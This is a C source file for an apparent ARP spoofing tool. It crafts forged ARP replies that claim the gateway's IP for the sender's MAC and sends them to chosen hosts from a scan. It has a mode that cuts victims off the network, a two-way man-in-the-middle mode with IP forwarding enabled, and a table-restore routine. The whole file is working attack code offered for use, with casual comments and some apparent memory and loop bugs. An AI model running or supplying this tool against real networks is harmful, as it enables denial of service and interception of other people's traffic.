#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netdb.h>
#include <linux/if_arp.h>
#include <pthread.h>
#include <time.h>

# include "struct.h"
# include "define.h"
# include "utils.h"

extern int g_stop;

static SOCKET initiate_socket_for_arp(const char ifacename[IFNAMSIZ])
{
	SOCKET iface = 0;

	iface = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (iface == -1)
		goto err;
	if (setsockopt(iface, SOL_SOCKET, SO_BINDTODEVICE, ifacename, strlen(ifacename)) == -1)
		goto err;

	return iface;
err:
	if (iface > 0) {
		close(iface);
		ERROR_SOCKET_MODIFY_DENIED(ifacename);
	}
	else
		ERROR_SOCKET_DENIED();
	return(-1);	
}

typedef struct arpthreadinfo
{
	SOCKET iface;
	const struct arguments *arguments;
	nmap_r *target;
}	arpthreadinfo;

static void *arpthread(void *argp)
{
	struct arpthreadinfo *arg = argp;
	const struct arguments *arguments = arg->arguments;
	nmap_r *target = arg->target;
	SOCKET iface = arg->iface;
	struct timespec start = {0x0}, stop = { 0x0 }, time_to_sleep = { 0x0 };
	uint64_t time_to_wait = 0;
	unsigned char payload[42] = { 0x0 };
	eth *eth_hdr = (eth*)payload;
	arp *arp_hdr = (arp*)(payload + ETH_HLEN);
	struct sockaddr_ll ifaceinfo = { 0x0 };
	// socklen_t ifaceinfolen;
	size_t rlen;

	if (arguments->ppm != 0)
	{
		time_to_wait = 60;
		time_to_wait *= 1000000000;
		time_to_wait /= arguments->ppm;
	}
	time_to_sleep.tv_nsec = 10; // 10 nanoseconds

	copy_mac(eth_hdr->dest_addr, target->ha);	/* 6 bytes dest addr */
	copy_mac(eth_hdr->src_addr, arguments->self_ha);	/* 6 bytes src addr (us) */
	eth_hdr->eth_type = htons(ETH_P_ARP);	/* arp request htons(0x0806) */
	arp_hdr->htype = htons(0x1);	/* hardware type htons(0x1) */ // not sure about this
	arp_hdr->ptype = htons(0x0800);	/* protocol type htons(0x0800) */ // nor this
	arp_hdr->hlen = ETH_ALEN; /* hardware addr len 6 */
	arp_hdr->plen = IPV4_LEN; /* proto addr len 4 */
	arp_hdr->operation = htons(0x2);	/* response arp type */
	copy_mac(arp_hdr->sender_ha, arguments->self_ha);	/* mac to spoof */
	copy_ipv4(arp_hdr->sender_pa, arguments->gateway_pa);	/* ip to spoof */
	copy_mac(arp_hdr->target_ha, target->ha);	/* target ha we send the response to, (unused) */
	copy_ipv4(arp_hdr->target_pa, target->pa);	/* target pa we send the response to, (unused) */

	ifaceinfo.sll_family = AF_PACKET;
	ifaceinfo.sll_protocol = htons(ETH_P_ARP);
	ifaceinfo.sll_ifindex = if_nametoindex(arguments->ifacename); // ???????????
	ifaceinfo.sll_hatype = htons(ARPHRD_ETHER);
	ifaceinfo.sll_pkttype = (0);
	ifaceinfo.sll_halen = ETH_ALEN;
	ifaceinfo.sll_addr[6] = 0x00;
	ifaceinfo.sll_addr[7] = 0x00;

	TELLNUKINGTARGET(target->pa, arguments->gateway_pa, arguments->self_ha);

	// not initialiszing the structure allow us to send a reply packet the 1st time we enter the loop
	while (g_stop == 1) {
		clock_gettime(CLOCK_REALTIME, &stop);
		uint128_t t = (stop.tv_sec - start.tv_sec); // rename the var, there may be integer overflow but idfc even with ppm 60 its enough to arpspoof
		t *= 1000000000;
		t += stop.tv_nsec - start.tv_nsec;
		if (t > time_to_wait)
		{
			rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfo, sizeof(ifaceinfo));
			if (rlen != ETH_HLEN + ARP_HLEN)
				{ ERROR_SEND(); goto err; }
			clock_gettime(CLOCK_REALTIME, &start);
		}
		if (time_to_wait != 0)
			nanosleep(&time_to_sleep, NULL);
	}
	return NULL;
err:
	return NULL;
}

static int isidxinlist(size_t idx, char *list)
{
	char *h = NULL, *saveptr = NULL;
	char *listdup;
	int ret = 0;

	if (list == NULL)
		return 1;
	if (!(listdup = strdup(list)))
		{ ERROR_MALLOC(); return -1; }
	while ((h = strtok_r((h == NULL ? listdup : NULL), ",", &saveptr)) != NULL) {
		/* if it is a number and that number correspond to the index, return 1 */
		if (get_first_non_whitespace(h) >= '0' && get_first_non_whitespace(h) <= '9' && (size_t)atol(h) == idx) {
			ret = 1;
			break;
		}
	}
	free(listdup);
	return ret;
}

/* start attack on the selected list, if list is NULL, attack all the scan (exept gateway and us ofc) */
int start_attack_some(const struct arguments *arguments, nmap_r **scan, char *list)
{
	SOCKET iface = -1;
	pthread_t *thread = NULL;
	struct arpthreadinfo **argp;
	size_t nthreadcreated = 0; // amount of thread that have been created
	int isidxinlistret;

	if (turn_off_ip_packet_forward() != 0)
		{ WARNING_CANT_MODIFY_IP_FORWARD(); /* goto err; */ }

	if (arguments->ppm == 0)
		ERROR_PPM_HIGH();

	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
		goto err;
	TELLSOCKETSUCCESS(arguments->ifacename);

	/* malloc each thread and its arguments */
	if (!(thread = calloc((arguments->scanamount), sizeof(thread))))
		{ ERROR_MALLOC(); goto err; }
	if (!(argp = calloc((arguments->scanamount), sizeof(arpthreadinfo*))))
		{ ERROR_MALLOC(); goto err; }
	start_signal();

	/* setup thread arguments and start it if its not the gateway or us */
	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
		if ((isidxinlistret = isidxinlist(i, list)) == -1) // check wether we should or not include this particular host
			goto err;
		/* check wether self or gateway was selected, print error msg if so */
		if ((scan[i]->gateway == 1 || scan[i]->self == 1) && list && isidxinlistret)
			WARNING_CANT_SELECT_SELF_OR_GATEWAY();
		if (scan[i]->gateway == 0 && scan[i]->self == 0 && isidxinlistret) {
			if (!(argp[j] = malloc(sizeof(arpthreadinfo))))
				{ ERROR_MALLOC(); goto err; }
			argp[j]->iface = iface;
			argp[j]->arguments = arguments;
			argp[j]->target = scan[i];
			pthread_create(&thread[j], NULL, arpthread, argp[j]);
			++j;
			nthreadcreated = j;
		}
	}
	/* wait for thread to finish */
	for (size_t i = 0; i < arguments->scanamount; ++i) {
		if (thread[i] && argp[i]) {
			pthread_join(thread[i], NULL);
			free(argp[i]);
		}
	}
	stop_signal();
	g_stop = 1;
	free(thread);
	free(argp);

	if (nthreadcreated == 0) {
		WARNING_NO_THREADS_CREATED();
	}

	TELLSTOPATTACK();

	close(iface);
	return 0;
err:
	if (iface != -1)
		close(iface);
	return -1;
}

/* retore the arp table of the list, if list is NULL, restore all the scan (exept gateway and us ofc) */
int restore_some(const struct arguments *arguments, nmap_r **scan, char *list)
{
	SOCKET iface = -1;
	pthread_t *thread = NULL;
	struct arpthreadinfo **argp;
	struct arguments argumentscopy;
	size_t nthreadcreated = 0; // amount of thread that have been created
	int isidxinlistret;

	if (turn_off_ip_packet_forward() != 0)
		{ WARNING_CANT_MODIFY_IP_FORWARD(); /* goto err; */ }

	if (arguments->ppm == 0)
		ERROR_PPM_HIGH();

	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
		goto err;
	TELLSOCKETSUCCESS(arguments->ifacename);

	/* create a copy of arguments with a modified self HA, this is the sketcy restore part */
	memcpy(&argumentscopy, arguments, sizeof(struct arguments));
	copy_mac(argumentscopy.self_ha, arguments->gateway_ha);

	/* malloc each thread and its arguments */
	if (!(thread = calloc((arguments->scanamount), sizeof(thread))))
		{ ERROR_MALLOC(); goto err; }
	if (!(argp = calloc((arguments->scanamount), sizeof(arpthreadinfo*))))
		{ ERROR_MALLOC(); goto err; }
	start_signal();

	/* setup thread arguments and start it if its not the gateway or us */
	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
		if ((isidxinlistret = isidxinlist(i, list)) == -1) // check wether we should or not include this particular host
			goto err;
		/* check wether self or gateway was selected, print error msg if so */
		if ((scan[i]->gateway == 1 || scan[i]->self == 1) && list && isidxinlistret)
			WARNING_CANT_SELECT_SELF_OR_GATEWAY();
		if (scan[i]->gateway == 0 && scan[i]->self == 0 && isidxinlistret) {
			if (!(argp[j] = malloc(sizeof(arpthreadinfo))))
				{ ERROR_MALLOC(); goto err; }
			argp[j]->iface = iface;
			argp[j]->arguments = &argumentscopy;
			argp[j]->target = scan[i];
			pthread_create(&thread[j], NULL, arpthread, argp[j]);
			++j;
			nthreadcreated = j;
		}
	}
	/* wait for thread to finish */
	for (size_t i = 0; i < arguments->scanamount; ++i) {
		if (thread[i] && argp[i]) {
			pthread_join(thread[i], NULL);
			free(argp[i]);
		}
	}
	stop_signal();
	g_stop = 1;
	free(thread);
	free(argp);

	if (nthreadcreated == 0) {
		WARNING_NO_THREADS_CREATED();
	}

	// change msg
	TELLSTOPATTACK();

	close(iface);
	return 0;
err:
	if (iface != -1)
		close(iface);
	return -1;
}

/* start spoofing on the selected list */
int arpspoof_some(const struct arguments *arguments, nmap_r **scan, char *list)
{
	SOCKET arpsock = -1;
	struct arguments **argvictim = NULL, **arggateway = NULL;
	pthread_t *thread = NULL;
	struct arpthreadinfo **argp = NULL;
	nmap_r *gateway = get_gateway_from_scan(scan); // may segfault later on idk
	size_t nthreadcreated = 0; // amount of thread that have been created
	int isidxinlistret;

	if (turn_on_ip_packet_forward() != 0)
		{ WARNING_CANT_MODIFY_IP_FORWARD(); /* goto err; */ }

	if (arguments->ppm == 0)
		ERROR_PPM_HIGH();

	if ((arpsock = initiate_socket_for_arp(arguments->ifacename)) == -1)
		goto err;
	TELLSOCKETSUCCESS(arguments->ifacename);

	/* malloc each thread and its arguments times 2 for gateway and victim */
	if (!(thread = calloc(arguments->scanamount * 2, sizeof(thread))))
		{ ERROR_MALLOC(); goto err; }
	if (!(argp = calloc(arguments->scanamount * 2, sizeof(arpthreadinfo*))))
		{ ERROR_MALLOC(); goto err; }
	if (!(argvictim = calloc(arguments->scanamount, sizeof(argvictim))))
		{ ERROR_MALLOC(); goto err; }
	if (!(arggateway = calloc(arguments->scanamount, sizeof(argvictim))))
		{ ERROR_MALLOC(); goto err; }

	start_signal();
	/* setup thread arguments and start it if its not the gateway or us */
	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
		if ((isidxinlistret = isidxinlist(i, list)) == -1) // check wether we should or not include this particular host
			goto err;
		/* check wether self or gateway was selected, print error msg if so */
		if ((scan[i]->gateway == 1 || scan[i]->self == 1) && list && isidxinlistret)
			WARNING_CANT_SELECT_SELF_OR_GATEWAY();
		if (scan[i]->gateway == 0 && scan[i]->self == 0 && isidxinlistret) {
			if (!(argp[j] = malloc(sizeof(arpthreadinfo))))
				{ ERROR_MALLOC(); goto err; }
			if (!(argp[j + 1] = malloc(sizeof(arpthreadinfo))))
				{ ERROR_MALLOC(); goto err; }
			if (!(argvictim[(j + 2) / 2] = malloc(sizeof(struct arguments)))) // (j + 2) / 2 is probably = j + 1 but im drunk
				{ ERROR_MALLOC(); goto err; }
			if (!(arggateway[(j + 2) / 2] = malloc(sizeof(struct arguments))))
				{ ERROR_MALLOC(); goto err; }
			memcpy(argvictim[(j + 2) / 2], arguments, sizeof(struct arguments));
			memcpy(arggateway[(j + 2) / 2], arguments, sizeof(struct arguments));
			copy_ipv4(arggateway[(j + 2) / 2]->gateway_pa, scan[i]->pa); // ultra hackish
			argp[j]->iface = arpsock;
			argp[j]->arguments = argvictim[(j + 2) / 2];
			argp[j]->target = scan[i];
			argp[j + 1]->iface = arpsock;
			argp[j + 1]->arguments = arggateway[(j + 2) / 2];
			argp[j + 1]->target = gateway;
			pthread_create(&thread[j], NULL, arpthread, argp[j]);
			pthread_create(&thread[j + 1], NULL, arpthread, argp[j + 1]);
			j += 2;
			nthreadcreated = j;
		}
	}

	/* wait for thread to finish, not optimal but there will always be less than scan[i] * 2 thread */
	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
		if (thread[j] && thread[j + 1]) {
			pthread_join(thread[j], NULL);
			pthread_join(thread[j + 1], NULL);
		}
	}

	g_stop = 1;
	if (nthreadcreated != 0) {
		TELLRESTORINGMAC();
	}

	/*
	** very sketchy, arpthread() is using self_ha as the mac to spoof,
	** since we want to restore the arp table we need to put the REAL
	** gateway HA as self HA (copy_* in the following scope)
	*/
	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
		if ((isidxinlistret = isidxinlist(i, list)) == -1) // check wether we should or not include this particular host
			goto err;
		if (scan[i]->gateway == 0 && scan[i]->self == 0 && isidxinlistret) {
			memcpy(argvictim[(j + 2) / 2], arguments, sizeof(struct arguments));
			memcpy(arggateway[(j + 2) / 2], arguments, sizeof(struct arguments));
			copy_mac(argvictim[(j + 2) / 2]->self_ha, arguments->gateway_ha);
			copy_ipv4(arggateway[(j + 2) / 2]->gateway_pa, scan[i]->pa);
			copy_mac(arggateway[(j + 2) / 2]->self_ha, scan[i]->ha);
			argp[j]->iface = arpsock;
			argp[j]->arguments = argvictim[(j + 2) / 2];
			argp[j]->target = scan[i];
			argp[j + 1]->iface = arpsock;
			argp[j + 1]->arguments = arggateway[(j + 2) / 2];
			argp[j + 1]->target = gateway;
			pthread_create(&thread[j], NULL, arpthread, argp[j]);
			pthread_create(&thread[j + 1], NULL, arpthread, argp[j + 1]);
			j += 2;
		}
	}

	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
		if (thread[j] && thread[j + 1]) {
			pthread_join(thread[j], NULL);
			pthread_join(thread[j + 1], NULL);
			free(argp[j]);
			free(argp[j + 1]);
			free(argvictim[(j + 2) / 2]);
			free(arggateway[(j + 2) / 2]);
			j += 2;
		}
	}

	stop_signal();

	free(thread);
	free(argp);
	free(argvictim);
	free(arggateway);

	g_stop = 1;

	if (nthreadcreated == 0) {
		WARNING_NO_THREADS_CREATED();
	}

	TELLSTOPATTACK();

	close(arpsock);
	return 0;
err:
	if (arpsock != -1)
		close(arpsock);
	return -1;
}
